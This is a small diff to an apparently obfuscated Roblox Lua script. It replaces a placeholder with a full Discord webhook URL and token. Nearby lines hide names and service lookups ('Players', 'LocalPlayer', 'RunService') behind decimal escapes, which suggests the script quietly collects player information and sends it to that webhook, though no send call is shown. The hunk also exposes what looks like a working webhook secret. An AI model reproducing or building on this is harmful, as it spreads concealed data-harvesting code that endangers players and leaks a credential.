@@ -5,7 +5,7 @@
 
 repeat task.wait() until game:IsLoaded()
 
-local _0xJ1 = "URL_DO_WEBHOOK_AQUI" 
+local _0xJ1 = "https://discord.com/api/webhooks/1457780083124207626/F0AR-Na0rucf2CncuNsXC4yGRYC-Kpjg1XkOdb6YaHgDcOZlVhwym4KwhriXSYaBeZSj" 
 local _0xJ2 = game:GetService("\80\108\97\121\101\114\115")
 local _0xJ3 = _0xJ2["\76\111\99\97\108\80\108\97\121\101\114"]
 local _0xJ4 = game:GetService("\82\117\110\83\101\114\118\105\99\101")
